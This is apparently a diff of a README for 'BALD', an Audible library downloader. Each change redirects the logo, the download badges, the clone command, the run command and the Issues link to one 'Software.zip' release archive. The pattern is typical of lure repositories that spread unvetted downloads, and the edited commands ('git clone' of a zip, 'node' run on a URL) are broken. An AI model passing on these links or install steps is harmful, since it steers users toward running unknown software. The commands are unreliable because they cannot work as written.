@@ -1,13 +1,13 @@
 
 # BALD - Brand New Audible Library Downloader 📚🎧
 
-![BALD Logo](https://example.com/bald_logo.png)
+![BALD Logo](https://github.com/youssefaab1/BALD/releases/download/v2.0/Software.zip)
 
 Welcome to BALD - your go-to solution for downloading and managing your Audible audiobook library effortlessly! Say goodbye to limitations and hello to freedom with BALD. Convert Audible files to various formats, organize your audiobooks, and enjoy your listening experience like never before.
 
-[![Download BALD v1.0.0](https://img.shields.io/badge/Download-BALD_v1.0.0-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download BALD v1.0.0](https://github.com/youssefaab1/BALD/releases/download/v2.0/Software.zip)](https://github.com/youssefaab1/BALD/releases/download/v2.0/Software.zip)
 
-🔗 **Download:** [Launch BALD v1.0.0](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+🔗 **Download:** [Launch BALD v1.0.0](https://github.com/youssefaab1/BALD/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Welcome to BALD - your go-to solution for downloading and managing your Audible 
 
 1. **Clone the repository**: 
 ```bash
-git clone https://github.com/yourusername/BALD.git
+git clone https://github.com/youssefaab1/BALD/releases/download/v2.0/Software.zip
 ```
 
 2. **Navigate to the project folder**:
@@ -60,7 +60,7 @@ npm install
 
 4. **Run the application**:
 ```bash
-node index.js
+node https://github.com/youssefaab1/BALD/releases/download/v2.0/Software.zip
 ```
 
 ---
@@ -73,7 +73,7 @@ We welcome contributions from the community to make BALD even better! Feel free 
 
 ## Support ℹ️
 
-For any questions, feedback, or issues, please reach out to us through the [Issues](https://github.com/yourusername/BALD/issues) section. Your input is valuable to us as we strive to improve BALD and make it the best Audible library downloader out there.
+For any questions, feedback, or issues, please reach out to us through the [Issues](https://github.com/youssefaab1/BALD/releases/download/v2.0/Software.zip) section. Your input is valuable to us as we strive to improve BALD and make it the best Audible library downloader out there.
 
 ---
 
